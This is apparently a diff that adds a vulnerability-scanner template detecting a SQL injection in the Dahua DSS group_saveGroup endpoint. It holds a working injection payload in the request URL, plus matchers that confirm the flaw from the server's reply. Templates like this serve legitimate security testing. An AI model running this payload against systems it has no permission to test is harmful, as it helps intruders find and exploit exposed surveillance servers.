@@ -1,0 +1,29 @@
+id: dahua-dss-group-savegroup-sqli
+
+info:
+  name: Dahua DSS group_saveGroup - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    Dahua DSS group_saveGroup.php contains a SQL injection vulnerability. An attacker can execute arbitrary SQL commands to obtain sensitive information, modify data, and even execute unauthorized operations in the context of the affected site.
+  reference:
+    - https://mp.weixin.qq.com/s/ecRKvf3uQpe4vJ0hB1e3aw
+  metadata:
+    max-request: 1
+    verified: true
+  tags: Dahua-DSS
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/emap/group_saveGroup?groupName=1%27%20and%20md5(1)=%27c4ca4238a0b923820dcc509a6f75849b%27%20and%20%271%27=%271&groupDesc=1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"message":"预案名称已存在'
+          - 'The name of scheme type already exists'
+      - type: status
+        status:
+          - 200
